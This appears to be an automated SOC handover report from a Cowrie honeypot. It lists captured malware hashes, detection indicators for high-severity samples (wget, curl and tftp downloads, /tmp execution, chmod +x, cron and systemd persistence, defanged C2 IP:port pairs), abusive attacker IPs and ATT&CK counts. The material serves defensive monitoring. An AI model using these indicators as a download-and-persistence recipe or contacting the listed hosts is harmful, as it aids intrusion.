| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `36.133.53[.]52` | CN | China Mobile Communications Corporation | **100** ⚠️ | 7 |
| `89.248.172[.]9` | NL | FiberXpress BV | **100** ⚠️ | 50 |
| `58.221.60[.]25` | CN | CHINANET jiangsu province network | **100** ⚠️ | 0 |
| `85.106.223[.]90` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 1 |
| `194.9.14[.]238` | UA | NEOCOM Ltd. | **100** ⚠️ | 2 |
| `51.77.158[.]34` | FR | OVH SAS | **100** ⚠️ | 50 |
| `74.113.234[.]187` | SG | CloudWebManage Platform Singapore | **100** ⚠️ | 2 |
| `119.120.42[.]125` | CN | CHINANET Guangdong province network | **100** ⚠️ | 1 |
| `66.228.62[.]150` | US | Linode | **100** ⚠️ | 50 |
| `80.94.95[.]109` | RO | UNMANAGED LTD | **100** ⚠️ | 18 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 325 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 297 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 104 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 98 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 21 |

---

## 🔕 False Positive Summary (33 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Known scanner ISP: Internet measurement research conducted by the Chair of Distributed | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 469 cases |
| Tool 34  | Credential Extractor        | ✅ 3710 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 26 fingerprints |
| Tool 36  | Command Clustering          | ✅ 25 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 295 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 33 filtered (7.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 148 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 26 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 294 priority case(s) shown individually · 130 recon entry/entries in table (8 group(s) consolidating 20 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-04T16:08:12Z_
